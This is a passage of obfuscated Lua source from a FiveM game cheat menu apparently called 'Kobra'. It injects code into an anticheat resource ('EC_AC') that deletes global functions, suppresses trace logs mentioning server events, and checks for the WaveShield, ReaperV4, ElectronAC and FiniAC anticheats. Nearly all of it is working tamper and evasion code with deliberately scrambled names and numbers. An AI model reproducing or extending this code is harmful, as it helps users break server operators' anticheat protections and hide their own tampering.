                    string.find(msg, "A11AXXX") or
                    string.find(msg, "function") or
                    string.find(msg, "TriggerServerEvent")
                ) then
                    originalTrace(msg)
                end
            end
        ]]);v1040=1;end if (v1040==1) then v1041={"EC_AC"};for v1249=2 -1 , #v1041 do local v1250=v1041[v1249];MachoInjectResource(v1250,[[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]]);Wait(1050);end v1040=3 -1 ;end end end if (GetResourceState("WaveShield")=="started") then v12:Notify("error","Kobra","WaveShield Anticheat Found.",3000);elseif (GetResourceState("ReaperV4")=="started") then v12:Notify("error","Kobra","ReaperV4 Anticheat Found.",5863 -2863 );elseif (GetResourceState("ElectronAC")=="started") then v12:Notify("error","Kobra","ElectronAC Anticheat Found.",4734 -(1691 + 43) );elseif (GetResourceState("FiniAC")=="started") then v12:Notify("error","Kobra","FiniAC Anticheat Found.",2864 + 136 );end end;